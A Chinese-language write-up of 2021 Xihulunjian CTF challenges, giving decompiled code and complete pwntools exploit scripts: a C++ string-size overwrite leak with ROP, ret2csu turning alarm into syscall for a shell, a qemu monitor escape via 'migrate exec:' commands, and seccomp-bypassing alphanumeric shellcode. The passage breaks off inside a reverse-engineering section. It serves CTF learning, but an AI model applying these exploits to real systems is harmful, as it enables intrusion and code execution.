# 前言
这是2021西湖论剑的部分pwn题目，题目有一定难度，但也有相对简单的题目，对以下五道题目进行复盘总结。
# PWN -> string_go (stack overflow,string struct)
## 题目分析
本题模仿pythonIDE使用C++编写的一个计算器，采用ptr下标溢出导致覆盖string结构的size字段来泄露栈内地址.
保护全开，ida分析主函数如下：
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  double v3; // xmm0_8
  char v4[32]; // [rsp+10h] [rbp-80h] BYREF
  char v5[32]; // [rsp+30h] [rbp-60h] BYREF
  char v6[40]; // [rsp+50h] [rbp-40h] BYREF
  unsigned __int64 v7; // [rsp+78h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  menu();
  while ( 1 )
  {
    python_input[abi:cxx11](v4, argv);
    argv = (const char **)v4;
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v6, v4);
    calc((__int64)v6);                        <--------------clac ------------>
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v6);
    if ( (int)v3 == 3 )
    {
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v5, v4);
      argv = (const char **)v5;
      lative_func((__int64)v6);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v6);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v5);
    }
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v4);
  }
}
```
题目先经过clac函数进行一些过滤和计算，结果如果=3则进入lative_func：
```c
__int64 __fastcall lative_func(__int64 a1)
{
  __int64 value; // rax
  size_t v3; // r12
  const void *v4; // rbx
  void *v5; // rax
  int idx; // [rsp+1Ch] [rbp-A4h] BYREF
  char v8[32]; // [rsp+20h] [rbp-A0h] BYREF
  char v9[32]; // [rsp+40h] [rbp-80h] BYREF
  char ptr[32]; // [rsp+60h] [rbp-60h] BYREF
  char v11[40]; // [rsp+80h] [rbp-40h] BYREF
  unsigned __int64 v12; // [rsp+A8h] [rbp-18h]

  v12 = __readfsqword(0x28u);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v9);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(ptr);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v11);
  std::operator<<<std::char_traits<char>>(&std::cout, ">>> ");
  std::istream::operator>>(&std::cin, &idx);   <--------输入下标------>
  split(v8, ptr);
  if ( !std::vector<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>>::size(v8) && idx <= 7 )
  {
    std::operator<<<std::char_traits<char>>(&std::cout, ">>> ");
    std::operator>><char>(&std::cin, ptr);          <--------输入字符串--------->
    std::operator<<<std::char_traits<char>>(&std::cout, ">>> ");
    value = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](ptr, idx); <---------返回ptr相应下标的地址>
    std::operator>><char,std::char_traits<char>>(&std::cin, value); <-------向该地址写入数据------>
  }
  std::operator<<<char>(&std::cout, ptr);  <---------输出ptr，此处用于泄露stack地址------>
  std::operator<<<std::char_traits<char>>(&std::cout, ">>> ");
  std::operator>><char>(&std::cin, v9);   <-------输入memcpy的size，可控--------->
  v3 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::size(v9);
  v4 = (const void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v9);
  v5 = (void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v11);
  memcpy(v5, v4, v3);  <---------存在溢出------->
  std::vector<std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>>::~vector(v8);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v11);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(ptr);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v9);
  return a1;
}
```
此函数存在由idx下标为负数时可以改写ptr的size，使得输出ptr的时候泄露栈地址，如下是idx=-1，输入value=0x33,*ptr=0x32的情况,此时size已经写入了0x33，变成了`0x3300000000000001`

```
    '>>> '                                                                                    │──────────────────────────────────────────────────────────────────────────────────────────────
[DEBUG] Sent 0x4 bytes:                                                                       │gef➤  telescope 0x00007ffe288d8320 20
    '1+2\n'                                                                                   │0x00007ffe288d8320│+0x0000: 0x00007ffe288d8420  →  0x00007ffe288d8430  →  0x00007ffe00322b31 (
[DEBUG] Received 0x4 bytes:                                                                   │"1+2"?)  ← $rsp
    '>>> '                                                                                    │0x00007ffe288d8328│+0x0008: 0x00007ffe288d8440  →  0x00007ffe288d8450  →  0x00007f0e00322b31 (
[DEBUG] Sent 0x3 bytes:                                                                       │"1+2"?)
    '-1\n'                                                                                    │0x00007ffe288d8330│+0x0010: 0x00007ffe288d8350  →  0x0000000000000000
[DEBUG] Received 0x4 bytes:                                                                   │0x00007ffe288d8338│+0x0018: 0xffffffffcfa02893
    '>>> '                                                                                    │0x00007ffe288d8340│+0x0020: 0x0000000000000000
[DEBUG] Sent 0x2 bytes:                                                                       │0x00007ffe288d8348│+0x0028: 0x0000000000000000
    '2\n'                                                                                     │0x00007ffe288d8350│+0x0030: 0x0000000000000000
[*] running in new terminal: ['/usr/bin/gdb', '-q', './string_go', '45127']                   │0x00007ffe288d8358│+0x0038: 0x00005624cfa02208  →  <calc(std::__cxx11::basic_string<char,+0> m
[DEBUG] Created script for new terminal:                                                      │ov QWORD PTR [rbp-0x80], rbx
    #!/usr/bin/python                                                                         │0x00007ffe288d8360│+0x0040: 0x00007ffe288d8370  →  0x00000003288d8500
    import os                                                                                 │0x00007ffe288d8368│+0x0048: 0x0000000000000000
    os.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', './string_go', '45127'], os.environ)     │0x00007ffe288d8370│+0x0050: 0x00000003288d8500
[DEBUG] Launching a new terminal: ['/usr/bin/tmux', 'splitw', '-h', '-F#{pane_pid}', '/tmp/tmp│0x00007ffe288d8378│+0x0058: 0x4008000000000000
8Hg7Mg']                                                                                      │0x00007ffe288d8380│+0x0060: 0x00007ffe288d8390  →  0x00005624d0930032  →  0x0000000000000000  <------ptr------>
[+] Waiting for debugger: Done                                                                │← $rax
[*] Paused (press any to continue)                                                            │0x00007ffe288d8388│+0x0068: 0x3300000000000001  <-----size----->
[DEBUG] Received 0x4 bytes:                                                                   │0x00007ffe288d8390│+0x0070: 0x00005624d0930032  →  0x0000000000000000
    '>>> '                                                                                    │0x00007ffe288d8398│+0x0078: 0x0000000000000000
[DEBUG] Sent 0x2 bytes:                                                                       │0x00007ffe288d83a0│+0x0080: 0x00007ffe288d83b0  →  0x0000000000000000
    '3\n'                                                                                     │0x00007ffe288d83a8│+0x0088: 0x0000000000000000
                                                                                              │0x00007ffe288d83b0│+0x0090: 0x0000000000000000
[*] Paused (press any to continue)                                                            │0x00007ffe288d83b8│+0x0098: 0x00007f0e99c4dbe6  →  <void+0> mov r12, QWORD PTR [rsp]

```
当`std::operator<<<char>(&std::cout, ptr);`的时候可以泄露地址，接下来就是常规的ROP，来控制控制流了。

## exp
```python
from pwn import *
local = 1
binary="./string_go"
elf = ELF(binary, checksec=False)
if local:
    context.terminal =['/usr/bin/tmux', 'splitw', '-h', '-F#{pane_pid}' ]
    p = process(binary)
    libc = ELF('./libc-2.27.so', checksec=False)
    bin_sh=0x00000000001b3e1a
    context.log_level = "debug"


else:
    p=remote("82.157.20.104", 32000)
    libc = ELF('./libc-2.27.so', checksec=False)
    bin_sh = 0x00000000001b3e1a
def debug_1(addr,show=[],PIE=True):

    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        for i in addr:
            debug_str+='b *{}\n'.format(str(hex(text_base+i)))
        for item in show:
            debug_str+='x /50xg {:#x}\n'.format(text_base+item)
        gdb.attach(p,debug_str)
    else:
        for i in addr:
            text_base=0
            debug_str+='b *{:#x}\n'.format(text_base+i)
        gdb.attach(p,debug_str)

def leak(ptr,index,value):
    p.sendlineafter(">>>", index)
    p.sendlineafter(">>>", ptr)
    gdb.attach(p)
    pause()
    p.sendlineafter(">>>", value)
    
    p.recv()
    info=p.recv(4096,timeout=1)
    
    print(info)

    pause()
    return info
p.sendlineafter(">>>","1+2")


info=leak(str(2),str(-1),str(3))

#debug_1([0x0000000000002415, 0x0000000000003cf3])
# info=p.recv(0x400)
# print(info[0:1])
# print(info)
# print(info)
canary=u64(info[7*8:7*8+8])
print("canary ==>",hex(canary))
elf_base=u64(info[9*8:9*8+8])-elf.symbols["_start"]
print("elf_base ==>",hex(elf_base))

off=0x000000000021BF7#libc.symbols["__libc_start_main"]+238
print(hex(off))
libc_base=u64(info[0xf8:0xf8+8])-off
print("libc_base ==>",hex(libc_base))


prdi=0x0000000000003cf3
ret = 0x00000000000014ce
payload=p64(0)*3+p64(canary)+p64(0)*3+p64(ret+elf_base)+p64(elf_base+prdi)+p64(libc_base+bin_sh)+p64(libc_base+libc.symbols["system"])

#gdb.attach(p)
p.sendline(payload)
#p.sendlineafter(">>>","aa")

p.interactive()


```
## 总结
C++实现的程序，通过string结构体，通过idx来覆盖size大小，造成地址泄露，memcpy溢出劫持控制流。需要对c++的一些结构有了解，ida反编译出的c++代码逻辑没有c的清晰，需要仔细分析各个对象的含义。
## 出题思路
1. C++逆向，简单的溢出。
2. 保护全开，泄漏地址点可以是通过idx溢出，覆盖结构体关键字段（size），输出时泄露地址。
# PWN -> blind (stack overflow,noleak,alarm to syscall)
## 题目分析
题目附件有一个readme，如下：
```text
Don't try to guess the libc version or Brute-force attack.Believe me, there will be no results,but there is a general way to solve it.
```
看来出题人不想让我们用泄露libc或者暴力攻击的方式攻击，可能远程环境libc被改了。
这道题目保护只开了NX，很简单的逻辑只有read函数存在溢出且没有其他可以泄露的函数，ida代码如下：
```c
ssize_t __fastcall main(int a1, char **a2, char **a3)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  alarm(8u);
  sleep(3u);
  return read(0, buf, 0x500uLL); <--------buffer overflow------->
}
```
明显存在栈溢出，对于没有泄露函数且只开了NX保护的基本栈溢出情况，我们攻击的基本方法是
1. 通过修改alarm函数的偏移使其变为syscall函数，从而调用syscall('/bin/sh',0,0)来拿shell
2. 通过修改alarm函数的偏移使其变为syscall函数，syscall调用write函数泄露alarm地址计算libc，溢出劫持控制流。
本题明显提示不能用libc的方法去攻击，所以选择一种方法。
## 利用
1. 通过通用方法ret2csu来构造rop修改alarm的末字节位'\x19'，指向syscall
2. csu调用read输入0x3b个字符，设置rax=0x3b(system调用号)
3. csu调用实现syscall('/bin/sh',0,0),拿到shell。
## exp
```python
from pwn import *

remote_addr=['127.0.0.1',49156] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
context.terminal = ["/bin/tmux", "sp","-h"]
context.log_level=True

#p=remote(remote_addr[0],remote_addr[1])
elf_path = "./blind"
p = process(elf_path)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(elf_path)

#gdb.attach(p, 'c')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def csu(addr,rbx,rbp,r12,r13,r14,r15,ret):
	 payload = p64(addr)    
	 payload += p64(rbx)     
	 payload += p64(rbp)     
	 payload += p64(r12)    
	 payload += p64(r13)    
	 payload += p64(r14)    
	 payload += p64(r15)    
	 payload += p64(ret)   
	 payload += 'A' * 8 * 7     
	 return payload
if __name__ == '__main__':
    bss = 0x601088
    
    alarm_got = elf.got["alarm"]
    read_plt = elf.got["read"]
    buff = 'A' * 88
    buff += csu(0x4007BA,0,1,read_plt,1,alarm_got,0,0x4007A0) # modify alarm 0x19
    buff += csu(0x4007BA,0,1,read_plt,0x3b,bss,0,0x4007A0) # modify rax=0x3b
    buff += csu(0x4007BA,0,1,alarm_got,0,0,bss,0x4007A0) # syscall('/bin/sh',0,0)
    buff = buff.ljust(0x500,'\x00')
    #gdb.attach(p)
    sn(buff)

    #sn('\x15') # ubuntu 18.04
    sn('\x19') #ubuntu20.04

    sn('/bin/sh\x00'+(0x3b-8)*'A')
    
    p.interactive()

```
## 总结
这个是比较常规的栈溢出的利用方式，当时做题思路被带偏了，一直在ret2dll-resolve而自己对ret2dll-resolve不太了解，用集成工具一直拿不到shell，没有想到这种利用方式，还是做题少，思路不够发散灵活。
## 出题思路
1. 最简单的栈溢出，保护只开NX保护,存在alarm
2. 简单栈溢出，NX，Partial RELRO，不存在alarm，只能re2dll-resolve和ROP泄露libc，如果需要限定只用ret2dll-resolve解法可以定制libc。
# PWN -> easy_kernel (qemu escape CTRL+A C)
## qemu逃逸
在qemu启动过程中qemu monitor也随之会启动，用来管理qemu的镜像。
如果qemu启动命令没有-monitor，就有可能存在qemu逃逸
方法：CTRL+A C进入qemu的monitor模式就可以运行一些命令了。
monitor模式下migrate命令：`migrate "exec:cp rootfs.img /tmp "`可以执行一些命令
## 题目分析
题目qemu没有关闭monitor，直接ctrl+A C进去逃逸，解压rootfs.img读flag
```bash
migrate "exec:cp rootfs.img /tmp "
migrate "exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2"
migrate "exec:cat /tmp/flag 1>&2"
```
```bash
(qemu) migrate "exec:cat /tmp/flag 1>&2"
flag{test_flag}qemu-system-x86_64: failed to save SaveStateEntry with id(name):)
qemu-system-x86_64: Unable to write to command: Broken pipe
qemu-system-x86_64: Unable to write to command: Broken pipe

```
## 总结
第一次尝试做这个kernel pwn，没想到是个简单的逃逸，考察队qemu逃逸的理解，和monitor下命令的运用。
## 出题思路
1. kernel pwn 简单的qemu逃逸。

# PWN -> code_project (Restricted shellcode,seccomp,alphanumberic shellcode encoder)
## 前置知识点
1. [pwn中的seccomp](https://www.jianshu.com/p/75e157cea215)
2. [writev函数结构](https://www.cnblogs.com/nufangrensheng/p/3559304.html)
3. [seccompByPass](https://www.anquanke.com/post/id/219077#h2-1)
## 题目分析
查看保护，发现少见的啥保护没开，运行程序发现依赖一个flag文件，本地测试先建一个flag文件，运行起来程序：
```bash
Code Project !
Hints: DASCTF{MD5}
aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    30925 illegal hardware instruction (core dumped)  ./code_project

```
strings查看编译环境为`Ubuntu 5.4.0-6ubuntu1~16.04.12`，ida查看代码,这里主函数反编译不了，因为ida不能正确识别call rdx这个代码，先将不能识别部分变成数据，然后反编译除此之外的其他部分：
```c
void __fastcall sub_4009DF(__int64 a1, char **a2, char **a3)
{
  char buf[512]; // [rsp+0h] [rbp-210h] BYREF
  char *v4; // [rsp+200h] [rbp-10h]
  int v5; // [rsp+208h] [rbp-8h]
  int i; // [rsp+20Ch] [rbp-4h]

  ((void (__fastcall *)(__int64, char **, char **))readflag)(a1, a2, a3);// 读取本地flag到mmap随机映射的内存空间
  puts("Code Project !");
  puts("Hints: DASCTF{MD5}");
  memset(buf, 0, sizeof(buf));
  v5 = read(0, buf, 0x100uLL);
  buf[v5] = 0;
  if ( v5 <= 15 )
  {
    puts("The code is too short !");
    exit(1);
  }
  for ( i = 0; v5 - 1 > i; ++i )
  {
    if ( buf[i] <= 47 || buf[i] > 57 && buf[i] <= 64 || buf[i] > 90 && buf[i] <= 96 || buf[i] > 122 )// shellcode过滤，只能是明文数字、大小写字母
    {
      puts("hacker !");
      exit(1);
    }
  }
  seccomp();                                    // 沙箱，禁用read、write、open、ececve等系统调用
  v4 = buf;
  JUMPOUT(0x400B16LL);                          // call shellcode
}
```
readflag函数：
```c
int readflag()
{
  __int64 buf[2]; // [rsp+0h] [rbp-20h] BYREF
  void *v2; // [rsp+10h] [rbp-10h]
  int fd; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  alarm(0x10u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  v4 = open("./flag", 0);                       // 打开flag文件
  fd = open("/dev/urandom", 0);
  if ( v4 == -1 || fd == -1 )
  {
    puts("open error !");
    exit(-1);
  }
  buf[0] = 0LL;
  buf[1] = 0LL;
  read(fd, buf, 4uLL);                          // 将随机数输入buf
  v2 = mmap((void *)(buf[0] & 0xFFFF000), 0x1000uLL, 3, 34, -1, 0LL);// mmap映射随机内存
  read(v4, v2, 0x30uLL);                        // flag读入内存
  close(fd);                                    // 关闭文件
  return close(v4);
}
```
沙箱函数：
```c
int seccomp()
{
  int result; // eax
  __int16 v1; // [rsp+0h] [rbp-10h] BYREF
  void *v2; // [rsp+8h] [rbp-8h]

  v1 = 19;
  v2 = &unk_6010A0;
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) < 0 )      // 禁用系统调用
  {
    puts("PR_SET_NO_NEW_PRIVS");
    exit(2);
  }
  result = prctl(22, 2LL, &v1);                 // 禁用open，read、write
  if ( result < 0 )
  {
    puts("PR_SET_SECCOMP");
    exit(2);
  }
  return result;
}
```
所以题目的利用方式不能是获取shell了，只能是读取flag，可见出题人是没想让我们拿到shell。只能写shellcode来把flag都出来了。
## 利用
题目保护都没开，但是开了沙箱，禁用了相当多的系统调用，但是没有禁用writev函数，还是留了个活口的，而且shellcode有限制，这里好解决，有开源的alphanumberic shellcode encoder，简介在[这里](http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode)，对于x64有杭电大佬写的[AE64](https://github.com/veritas501/ae64)来加密shellcode，这里主要解决的问题就是shellcode怎么写去读随机内存的flag.
本来想着在readflag函数后会有随机内存残留在栈上，通过writev来泄露出来读取，但是不幸的是栈上映射出来的随机内存被后面的put函数调用给覆盖掉了，所以这里只能写一个shellcode来输出整个mmap空间来寻找flag。
writev函数函数定义及结构:
```c
#include <sys/uio.h>
ssize_t writev(int filedes, const struct iovec *iov, int iovcnt);

struct iovec {
    void      *iov_base;      /* starting address of buffer */
    size_t    iov_len;        /* size of buffer */
};
```
关键是iovec结构体，是输出的地址结构体，成员变量是ptr和他的大小。
**构造shellcode思路:**
总体调用wrtiev(1,ptr,1)循环读取mmap内存空间，由下可以看到内存分布：
```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x3fe000           0x400000 rw-p     2000 0      /home/yrl/Desktop/saishi/比赛/xihulunjian/pwn/codeproject/code_project_bck
          0x400000           0x401000 r-xp     1000 2000   /home/yrl/Desktop/saishi/比赛/xihulunjian/pwn/codeproject/code_project_bck
          0x600000           0x601000 r--p     1000 2000   /home/yrl/Desktop/saishi/比赛/xihulunjian/pwn/codeproject/code_project_bck
          0x601000           0x602000 rw-p     1000 3000   /home/yrl/Desktop/saishi/比赛/xihulunjian/pwn/codeproject/code_project_bck
         0x40c1000          0x40c2000 rw-p     1000 0      
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
    0x7ffff7ff3000     0x7ffff7ff6000 rw-p     3000 0      
    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffdd000     0x7ffffffff000 rwxp    22000 0      [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]

```
看到mmap分配内存的范围是0x602000-0x7ffff7a0d000之间，但是因为内存对齐，可以参考程序里面的data段，可以确定我们要输出起始地址为0x00601080,然后以0x1000大小的内存页循环往下输出找flag
shellcode如下:
```asm
/* writev(1,0x601080,1) */
push 1 
pop rdi
push 0x601080
pop rsi   /* iovec point */
push 1
pop rdx
push 0x30
pop r14
mov [rsi+8],r14  /* iov_len = 0x30 */
push 0x1000
pop r15
mov [rsi],r15 /* iov_base = 0x1000 */
search:
    push 0x14
    pop rax
    syscall
    add [rsi], r15 /* range */
    jmp search
```
jmp无条件跳转循环读取内存空间。这里的iov_len=0x30是本地测试测出来flag在内存页的最开始，所以用了相对较小的长度，也可以用0x1000以免漏掉flag。
注意：尽量少用mov减少shellcode长度，使用AE64的small虽然可以减小长度但是shellcode就不好用了。
**拓展:**
```bash
系统调用号:  openat = 0x101
            readv  = 0x13
            writev = 0x14
```
在读入之前将shellcode转成asm，然后用AE64加密传入程序：
```python
payload = AE64().encode(asm(shellcode,arch='amd64'),'rdx')
```
## exp
```python
# -*- coding: UTF-8 -*-
from pwn import *
from ae64 import AE64

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('127.0.0.1', 49153)
io = process('./code_project_bck')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


# (1,0x601080,1) *rsi = 0x1000  *rsi+8 = 0x30
shellcode = '''
push 1
pop rdi
push 0x601080
pop rsi
push 1
pop rdx
push 0x30
pop r14
mov [rsi+8],r14
push 0x1000
pop r15
mov [rsi],r15
search:
    push 0x14
    pop rax
    syscall
    add [rsi], r15
    jmp search
'''
shellcode_1 = ''' /*长度不合适*/
push 1
pop rdi 
push 0x1
pop rdx
mov esi, 0x1010101
xor esi, 0x1611181
push 0x1601101
pop r14
xor r14, 0x1010101
push 0x1011101
pop r15
xor r15,0x1010101
search:
    add r14, r15 /*r14: addr*/
    mov [rsi], r15
    mov [rsi+8], r15
    push SYS_writev
    pop rax
    syscall
    jmp search
'''
payload = AE64().encode(asm(shellcode,arch='amd64'),'rdx')
print(payload)
#gdb.attach(io)
sn(payload)
irt()
```
## 总结
这道题目算是我第一次接触seccomp的题目，搞了半天发现有沙箱，eimo了，不知道为啥我的seccomp-tools没找出来禁用哪些调用，总体感觉一道简单的题目我总是搞不出来，总感觉知识欠缺太多了，利用思路不开放，是不是多练习就有思路了呢IOT了
## 出题思路
1. 不开安全保护，shellcode过滤，shellcode加密，alphanumberic shellcode encoder
2. seccomp、seccomp by pass，writev的应用
3. shellcode编写
## 参考
[prtcl](https://www.jianshu.com/p/75e157cea215)
[alphanumeric-shellcode](http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode)
# Re -> ROR (Z3)
## 题目分析
题目附件是一个32位的exe文件，ida打开发现如下逻辑：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+0h] [ebp-2C0h]
  char v5; // [esp+8Fh] [ebp-231h]
  int v6[9]; // [esp+94h] [ebp-22Ch]
  int j; // [esp+B8h] [ebp-208h]
  unsigned int i; // [esp+BCh] [ebp-204h]
  char Buf2[256]; // [esp+C0h] [ebp-200h] BYREF
  char input[256]; // [esp+1C0h] [ebp-100h] BYREF

  __CheckForDebuggerJustMyCode(&unk_406029);
  v6[0] = 128;
  v6[1] = 64;
  v6[2] = 32;
  v6[3] = 16;
  v6[4] = 8;
  v6[5] = 4;
  v6[6] = 2;
  v6[7] = 1;
  memset(input, 0, sizeof(input));
  memset(Buf2, 0, sizeof(Buf2));
  sub_401650("Input:", v4);
  sub_4016A0("%40s", (char)input);
  if ( strlen(input) != 40 )
    exit(0);
  for ( i = 0; i < 0x28; i += 8 )
  {
    for ( j = 0; j < 8; ++j )
    {
      v5 = ((v6[j] & input[i + 3]) << (8 - (3 - j) % 8u)) | ((v6[j] & (unsigned int)input[i + 3]) >> ((3 - j) % 8u)) | ((v6[j] & input[i + 2]) << (8 - (2 - j) % 8u)) | ((v6[j] & (unsigned int)input[i + 2]) >> ((2 - j) % 8u)) | ((v6[j] & input[i + 1]) << (8 - (1 - j) % 8u)) | ((v6[j] & (unsigned int)input[i + 1]) >> ((1 - j) % 8u)) | ((v6[j] & (unsigned __int8)input[i]) << (8 - -j % 8u)) | ((v6[j] & (unsigned int)input[i]) >> (-j % 8u));
      Buf2[j + i] = table[(unsigned __int8)(((v6[j] & (unsigned __int8)input[i + 7]) << (8 - (7 - j) % 8u)) | ((v6[j] & (unsigned int)input[i + 7]) >> ((7 - j) % 8u)) | ((v6[j] & input[i + 6]) << (8 - (6 - j) % 8u)) | ((v6[j] & (unsigned int)input[i + 6]) >> ((6 - j) % 8u)) | ((v6[j] & input[i + 5]) << (8 - (5 - j) % 8u)) | ((v6[j] & (unsigned int)input[i + 5]) >> ((5 - j) % 8u)) | ((v6[j] & input[i + 4]) << (8 - (4 - j) % 8u)) | ((v6[j] & (unsigned int)input[i + 4]) >> ((4 - j) % 8u)) | v5)];
    }
  }
  if ( memcmp(&enc, Buf2, 0x28u) )
  {
    puts("Wrong");
    exit(0);
  }
  puts("Congratulations");
  puts("flag is DASCTF{your input}");
  return 0;
}
```
程序逻辑很简单，关键是循环里面的移位转换操作是什么算法，怎么逆向；程序最后的加密密文enc和table表都是知道的，加密流程如下：
对每个字节进行转换，转换后在table表里索引得到值就是对应的enc，所以首先要将真正的计算结果算出来，所以先拿enc匹配获得table的下标，就是每个字节转换后的结果，之后最方便的方法就是用Z3约束求解，一把梭哈。
## exp
```python
enc = [
  0x65, 0x55, 0x24, 0x36, 0x9D, 0x71, 0xB8, 0xC8, 0x65, 0xFB, 
  0x87, 0x7F, 0x9A, 0x9C, 0xB1, 0xDF, 0x65, 0x8F, 0x9D, 0x39, 
  0x8F, 0x11, 0xF6, 0x8E, 0x65, 0x42, 0xDA, 0xB4, 0x8C, 0x39, 
  0xFB, 0x99, 0x65, 0x48, 0x6A, 0xCA, 0x63, 0xE7, 0xA4, 0x79, 
  0xFF, 0xFF, 0xFF, 0xFF 
]

table = [
  0x65, 0x08, 0xF7, 0x12, 0xBC, 0xC3, 0xCF, 0xB8, 0x83, 0x7B, 
  0x02, 0xD5, 0x34, 0xBD, 0x9F, 0x33, 0x77, 0x76, 0xD4, 0xD7, 
  0xEB, 0x90, 0x89, 0x5E, 0x54, 0x01, 0x7D, 0xF4, 0x11, 0xFF, 
  0x99, 0x49, 0xAD, 0x57, 0x46, 0x67, 0x2A, 0x9D, 0x7F, 0xD2, 
  0xE1, 0x21, 0x8B, 0x1D, 0x5A, 0x91, 0x38, 0x94, 0xF9, 0x0C, 
  0x00, 0xCA, 0xE8, 0xCB, 0x5F, 0x19, 0xF6, 0xF0, 0x3C, 0xDE, 
  0xDA, 0xEA, 0x9C, 0x14, 0x75, 0xA4, 0x0D, 0x25, 0x58, 0xFC, 
  0x44, 0x86, 0x05, 0x6B, 0x43, 0x9A, 0x6D, 0xD1, 0x63, 0x98, 
  0x68, 0x2D, 0x52, 0x3D, 0xDD, 0x88, 0xD6, 0xD0, 0xA2, 0xED, 
  0xA5, 0x3B, 0x45, 0x3E, 0xF2, 0x22, 0x06, 0xF3, 0x1A, 0xA8, 
  0x09, 0xDC, 0x7C, 0x4B, 0x5C, 0x1E, 0xA1, 0xB0, 0x71, 0x04, 
  0xE2, 0x9B, 0xB7, 0x10, 0x4E, 0x16, 0x23, 0x82, 0x56, 0xD8, 
  0x61, 0xB4, 0x24, 0x7E, 0x87, 0xF8, 0x0A, 0x13, 0xE3, 0xE4, 
  0xE6, 0x1C, 0x35, 0x2C, 0xB1, 0xEC, 0x93, 0x66, 0x03, 0xA9, 
